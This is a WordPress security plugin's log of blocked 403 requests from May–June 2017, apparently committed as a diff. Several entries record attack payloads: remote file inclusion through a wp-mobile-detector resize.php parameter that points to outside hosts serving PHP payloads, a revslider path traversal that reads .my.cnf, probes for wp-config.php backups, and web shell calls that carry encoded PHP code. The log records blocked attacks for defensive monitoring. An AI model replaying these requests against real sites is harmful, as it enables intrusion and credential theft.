+[403 GET Request: May 16, 2017 - 1:30 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 46.229.164.100
+Host Name: 46.229.164.100
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /robots.txt
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)
+
+[403 GET Request: May 16, 2017 - 12:41 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 72.14.176.31
+Host Name: li35-31.members.linode.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://whatsmycut.com/wp-includes/class-comments.php?blog=comments&title=American%20Power%20and%20Gas%20Reviews
+REQUEST_URI: /wp-includes/class-comments.php?blog=comments&title=American%20Power%20and%20Gas%20Reviews
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+
+[403 GET Request: May 20, 2017 - 12:47 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: PSBR-HPRA
+Solution: https://forum.ait-pro.com/forums/topic/security-log-event-codes/
+REMOTE_ADDR: 35.185.199.49
+Host Name: 49.199.185.35.bc.googleusercontent.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-content/plugins/wp-mobile-detector/resize.php?src=http://www.relationshiptips.club/cache/db.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32
+
+[403 POST Request: May 21, 2017 - 3:20 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 123.19.80.213
+Host Name: 123.19.80.213
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://whatsmycut.com/wp-includes/indes.php
+REQUEST_URI: /wp-includes/indes.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
+REQUEST BODY: yt=die(md5(1));
+
+[403 GET Request: May 21, 2017 - 4:06 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 46.229.168.74
+Host Name: 46.229.168.74
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /about
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)
+
+[403 GET Request: May 21, 2017 - 5:28 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 185.129.148.181
+Host Name: 185.129.148.181
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-includes/class.wp-date.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0
+
+[403 GET Request: May 22, 2017 - 4:24 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 185.129.148.181
+Host Name: 185.129.148.181
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-includes/LICENSE.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0
+
+[403 GET Request: May 22, 2017 - 7:46 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: PSBR-HPRA
+Solution: https://forum.ait-pro.com/forums/topic/security-log-event-codes/
+REMOTE_ADDR: 104.168.148.88
+Host Name: hwvps147435.hostwindsdns.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-content/plugins/wp-mobile-detector/resize.php?src=http://junuzovic-kopex.ba/wp-content/db.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32
+
+[403 GET Request: May 22, 2017 - 12:16 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: PSBR-HPRA
+Solution: https://forum.ait-pro.com/forums/topic/security-log-event-codes/
+REMOTE_ADDR: 104.168.148.88
+Host Name: hwvps147435.hostwindsdns.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-content/plugins/wp-mobile-detector/resize.php?src=http://junuzovic-kopex.ba/wp-content/db.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.32
+
+[403 GET Request: May 22, 2017 - 1:26 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 46.229.164.101
+Host Name: 46.229.164.101
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /robots.txt
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)
+
+[403 POST Request: May 24, 2017 - 3:13 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 185.129.148.181
+Host Name: 185.129.148.181
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-includes/class-comments.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0
+REQUEST BODY: pwd=c600e7179c3db8140360ecec6592183a&na43bbc=ZGllKHBpKCkqNDIpOw%3D%3D
+
+[403 GET Request: May 25, 2017 - 5:09 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 46.229.168.74
+Host Name: 46.229.168.74
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)
+
+[403 GET Request: May 25, 2017 - 5:09 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 46.229.168.73
+Host Name: 46.229.168.73
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /about/
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)
+
+[403 GET Request: May 27, 2017 - 2:39 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: PSBR-HPRA
+Solution: https://forum.ait-pro.com/forums/topic/security-log-event-codes/
+REMOTE_ADDR: 201.18.18.173
+Host Name: 201.18.18.173
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-content/plugins/wp-mobile-detector/resize.php?src=http://www.laptopscreenrepair.net.au/search/cache.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0
+
+[403 GET Request: May 28, 2017 - 12:03 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: PSBR-HPRA
+Solution: https://forum.ait-pro.com/forums/topic/security-log-event-codes/
+REMOTE_ADDR: 201.18.18.173
+Host Name: 201.18.18.173
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-content/plugins/wp-mobile-detector/resize.php?src=http://91.103.217.68/~kettfusion/wp-content/redux/cache.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0
+
+[403 GET Request: May 29, 2017 - 10:30 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: WPADMIN-SBR
+Solution: https://forum.ait-pro.com/forums/topic/security-log-event-codes/
+REMOTE_ADDR: 46.246.61.20
+Host Name: anon-61-20.vpn.ipredator.se
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-admin/admin-ajax.php?action=revslider_show_image&img=../../.my.cnf
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801
+
+[403 GET Request: May 29, 2017 - 12:25 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 185.129.148.181
+Host Name: 185.129.148.181
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-includes/theme-compat/comay.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0
+
+[403 GET Request: May 29, 2017 - 2:39 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: PSBR-HPRA
+Solution: https://forum.ait-pro.com/forums/topic/security-log-event-codes/
+REMOTE_ADDR: 201.18.18.173
+Host Name: 201.18.18.173
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: //wp-content/plugins/wp-mobile-detector/resize.php?src=http://91.103.217.68/~kettfusion/wp-content/redux/cache.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0
+
+[403 GET Request: May 29, 2017 - 8:12 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: WPADMIN-SBR
+Solution: https://forum.ait-pro.com/forums/topic/security-log-event-codes/
+REMOTE_ADDR: 104.168.148.88
+Host Name: hwvps147435.hostwindsdns.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-admin/admin-ajax.php?action=revslider_show_image&img=../../.my.cnf
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801
+
+[403 GET Request: May 30, 2017 - 10:21 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 46.229.164.102
+Host Name: 46.229.164.102
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /robots.txt
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)
+
+[403 GET Request: May 31, 2017 - 4:27 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 185.56.145.10
+Host Name: ssd56.totaalholding.nl
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://whatsmycut.com/wp-includes/cache-template.php
+REQUEST_URI: /wp-includes/cache-template.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4
+
+[403 GET Request: June 2, 2017 - 12:48 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: PSBR-HPRA
+Solution: https://forum.ait-pro.com/forums/topic/security-log-event-codes/
+REMOTE_ADDR: 201.18.18.173
+Host Name: 201.18.18.173
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-content/plugins/wp-mobile-detector/resize.php?src=http://a2qgroup.com/rbbenahji/cache.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0
+
+[403 GET Request: June 2, 2017 - 1:31 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 212.192.196.6
+Host Name: tproxy2001.nic.ru
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 10.12.14.53
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://whatsmycut.com/wp-includes/theme-compat/system.php
+REQUEST_URI: /wp-includes/theme-compat/system.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4
+
+[403 GET Request: June 2, 2017 - 8:35 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 46.229.168.70
+Host Name: 46.229.168.70
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /code-samples
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)
+
+[403 GET Request: June 3, 2017 - 9:55 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: PSBR-HPRA
+Solution: https://forum.ait-pro.com/forums/topic/security-log-event-codes/
+REMOTE_ADDR: 201.18.18.173
+Host Name: 201.18.18.173
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-content/plugins/wp-mobile-detector/resize.php?src=http://www.laptopscreenrepair.net.au/search/cache.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0
+
+[403 GET Request: June 4, 2017 - 1:19 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 89.161.138.38
+Host Name: cloudserver022898.home.net.pl
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://whatsmycut.com/wp-includes/security.php
+REQUEST_URI: /wp-includes/security.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4
+
+[403 GET Request: June 4, 2017 - 4:16 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 87.242.64.142
+Host Name: gen132.hs.shared.masterhost.ru
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://whatsmycut.com/wp-includes/class-wp-contact.php
+REQUEST_URI: /wp-includes/class-wp-contact.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4
+
+[403 GET Request: June 5, 2017 - 12:18 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 46.229.168.69
+Host Name: 46.229.168.69
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /about
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; SemrushBot/1.2~bl; +http://www.semrush.com/bot.html)
+
+[403 GET Request: June 5, 2017 - 7:41 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 178.210.90.90
+Host Name: tproxy1102.nic.ru
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 10.3.49.176
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://whatsmycut.com/wp-includes/logo_img.php
+REQUEST_URI: /wp-includes/logo_img.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4
+
+[403 GET Request: June 5, 2017 - 7:41 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 178.210.90.90
+Host Name: tproxy1102.nic.ru
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 10.3.49.176
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://whatsmycut.com/wp-includes/logo_img.php
+REQUEST_URI: /wp-includes/logo_img.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4
+
+[403 GET Request: June 5, 2017 - 9:03 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 178.210.90.90
+Host Name: tproxy1102.nic.ru
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 10.3.0.73
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://whatsmycut.com/wp-content/wflogs/rules.php
+REQUEST_URI: /wp-content/wflogs/rules.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/533.4 (KHTML, like Gecko) Chrome/5.0.375.99 Safari/533.4
+
+[403 GET Request: June 7, 2017 - 9:59 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 160.202.162.45
+Host Name: 160.202.162.45
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /readme.html
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
+
+[403 POST Request: June 8, 2017 - 9:44 am]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 185.129.148.181
+Host Name: 185.129.148.181
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-includes/class.wp-date.php
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0
+REQUEST BODY: pass=%23%5B%5E0_o%21W%3C%40_8%7D
+
+[403 GET Request: June 8, 2017 - 8:15 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 185.100.86.100
+Host Name: server.saveyourprivacy.is
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.php~
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0
+
+[403 GET Request: June 8, 2017 - 8:16 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 185.100.86.100
+Host Name: server.saveyourprivacy.is
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.phpOLD
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0
+
+[403 GET Request: June 8, 2017 - 8:16 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 185.100.86.100
+Host Name: server.saveyourprivacy.is
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.phpa
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0
+
+[403 GET Request: June 8, 2017 - 8:16 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 185.100.86.100
+Host Name: server.saveyourprivacy.is
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-config.php.txt
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:19.0) Gecko/20100101 Firefox/19.0
+
+[403 GET Request: June 8, 2017 - 8:20 pm]
+BPS: 1.1
+WP: 4.7.4
+Event Code: BFHS - Blocked/Forbidden Hacker or Spammer
+Solution: N/A - Hacker/Spammer Blocked/Forbidden
+REMOTE_ADDR: 78.109.23.1
+Host Name: tornode.torreactor.ml
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
